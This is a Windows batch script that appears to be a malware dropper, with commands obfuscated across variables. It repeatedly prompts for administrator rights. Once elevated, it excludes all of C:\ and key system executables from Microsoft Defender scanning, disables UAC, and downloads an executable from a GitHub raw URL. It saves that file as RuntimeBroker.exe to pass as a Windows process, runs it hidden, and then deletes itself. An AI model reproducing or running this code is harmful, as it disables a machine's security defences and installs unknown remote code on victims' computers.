@echo off & setlocal enableDelayedExpansion
set "cw=NET" & set "ck=SESSION" & set "oi=>nul" & set "sm=2>&1"
%cw% %ck% %oi% %sm%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "px=powershell -ExecutionPolicy Bypass -Command"
set "pz=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "zu='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "di='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!px! "!pz! !zu! !di!" %oi% %sm%
set "pp=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "cg=-Name 'EnableLUA' -Value 0"
!px! "!pp! !cg!" %oi% %sm%
set "pc=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!px! "!pc!" %oi% %sm%
if !errorlevel! neq 0 (goto %a%)
set "oi=timeout /t" & !oi! 2 %oi% %sm%
set "lx=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "mz=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "rx=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!px! "!lx! !mz! !rx!" %oi% %sm%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!oi! 1 %oi% %sm% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %oi% %sm%
del /f /q "%~f0" %oi% %sm%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %oi% %sm%
if !errorlevel! neq 0 (!oi! 3 %oi% %sm% & goto %b%)
exit /b
